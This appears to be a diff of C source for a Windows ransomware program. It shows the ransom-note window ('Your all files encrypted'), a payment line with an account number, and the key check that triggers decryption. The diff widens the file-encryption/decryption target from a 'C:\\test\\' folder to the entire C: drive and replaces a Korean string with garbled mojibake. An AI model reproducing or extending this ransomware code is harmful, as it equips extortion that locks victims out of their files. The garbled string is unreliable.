@@ -84,7 +84,7 @@ LRESULT CALLBACK WinProc(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)
         SetTextColor(hdc, RGB(0, 0, 0));
         TextOutA(hdc, 170, 400, "Key : ", 6);
         TextOutA(hdc, 170, 50, "Your all files encrypted zzlol.", 31);
-        TextOutA(hdc, 170, 100, "¿ì¸®ÀºÇà 1002262873043", 22);
+        TextOutA(hdc, 170, 100, "Â¿Ã¬Â¸Â®Ã€ÂºÃ‡Ã  1002262873043", 22);
         DeleteObject(myFont);
         myFont = CreateFont(15, 0, 0, 0, 1000, 0, 0, 0, DEFAULT_CHARSET, 0, 0, 0, 0, NULL);
         oldFont = (HFONT)SelectObject(hdc, myFont);
@@ -105,7 +105,7 @@ LRESULT CALLBACK WinProc(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)
                 MessageBoxA(hWnd, "It is not a decryption key for this program.", "ransomware", MB_OK);
             else {
                 MessageBoxA(hWnd, "Don't feel too bad about it. It was just bad luck.", "ransomware", MB_OK);
-                all_files_enc_dec("C:\\test\\", key, FALSE);
+                all_files_enc_dec("C:\\", key, FALSE);
                 MessageBoxA(hWnd, "Decrypted all files.", "ransomware", MB_OK);
                 PostQuitMessage(0);
             }
